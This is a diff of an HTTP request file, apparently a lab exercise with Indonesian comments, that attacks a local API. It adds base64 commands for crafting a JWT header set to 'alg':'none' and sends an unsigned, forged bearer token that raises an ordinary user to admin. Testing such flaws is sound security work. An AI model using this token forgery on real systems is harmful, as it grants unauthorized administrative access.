@@ -9,9 +9,18 @@ Content-Type: application/json
     "password" : "alice"
 }
 
+
+### 2. Akses token di decode berdasarkan Header, Payload, Footer
+
+### 3. echo "Token" | base64 -d
+
+### 4. echo -n '{ "alg":"none", "type":"jwt"}' | base64
+
+### 5. echo -n '{}' | base64
+
 ### 2. Menambah User dengan token NONE tanpa signature dan FORGED token role dari user biasa menjadi admin
 POST http://localhost:3000/api/users
-Authorization: Bearer eyJhbGciOiJub25lIiwgInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIyIiwibmFtZSI6ImFsaWNlIiwiZW1haWwiOiJhbGljZUBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY4NzQwMTU3NCwiaXNzIjoidXJuOmp3dCJ9.
+Authorization: Bearer eyAiYWxnIjoibm9uZSIsICJ0eXBlIjoiand0In0.eyJ1c2VySWQiOiIxIiwibmFtZSI6ImRkIiwiZW1haWwiOiJqb2huQGV4YW1wbGUuY29tIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjkxMTU1MTg3LCJpc3MiOiJ1cm46and0In0
 Content-Type: application/json
 
 {
